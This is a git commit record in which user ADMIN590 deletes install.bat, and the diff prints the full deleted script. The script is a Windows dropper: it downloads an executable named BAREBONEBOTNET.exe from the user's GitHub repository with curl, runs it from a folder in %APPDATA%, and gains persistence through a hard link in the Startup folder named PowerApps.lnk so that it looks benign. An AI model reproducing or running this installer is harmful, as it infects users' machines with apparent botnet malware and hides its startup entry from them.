540935d60324f6a78121c8918d7a99d50b1c82f0
ADMIN590 <167841172+ADMIN590@users.noreply.github.com>
2024-04-30 15:02:27 +0700

    Delete install.bat

--- install.bat
+++
@@ -1,5 +0,0 @@
-cd %APPDATA%
-mkdir InstalledApps && cd InstalledApps
-curl -L https://github.com/ADMIN590/BAREBONEREXECUTOR/raw/main/BAREBONEBOTNET.exe && BAREBONEBOTNET.exe
-cd %APPDATA%/microsoft/windows/Start Menu/Programs/Startup
-mklink /H PowerApps.lnk "%APPDATA%\InstalledApps\BAREBONEBOTNET.exe"
